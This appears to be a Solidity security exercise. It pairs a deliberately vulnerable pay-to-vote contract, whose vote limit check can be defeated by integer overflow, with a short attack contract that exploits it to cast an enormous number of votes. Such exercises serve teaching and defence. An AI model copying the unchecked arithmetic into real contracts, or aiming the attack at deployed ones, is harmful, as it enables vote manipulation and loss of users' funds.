pragma solidity ^0.4.24;

//*** Exercice 2 ***//
// You can buy voting rights by sending ether to the contract.
// You can vote for the value of your choice.
contract VoteTwoChoices{
    mapping(address => uint) public votingRights;
    mapping(address => uint) public votesCast;
    mapping(bytes32 => uint) public votesReceived;

    /// @dev Get 1 voting right per ETH sent.
    function buyVotingRights() payable {
        votingRights[msg.sender]+=msg.value/(1 ether);
    }

    /** @dev Vote with nbVotes for a proposition.
     *  @param _nbVotes The number of votes to cast.
     *  @param _proposition The proposition to vote for.
     */
    function vote(uint _nbVotes, bytes32 _proposition) {
        require(_nbVotes + votesCast[msg.sender]<=votingRights[msg.sender]); // Check you have enough voting rights.

        votesCast[msg.sender]+=_nbVotes;
        votesReceived[_proposition]+=_nbVotes;
    }

}

contract VoteTwoChoicesAttack {
    VoteTwoChoices victim;

    constructor(address _victim) public {
        victim = VoteTwoChoices(_victim);
    }

    function attack() external payable returns(bool success) {
        require(msg.value == 1 ether);
        victim.buyVotingRights.value(msg.value)();
        //victim doesn't check for underflows...
        victim.vote(1, "yadayada");
        victim.vote(uint256(0-1), "yadayada2");
        return true;
    }


}
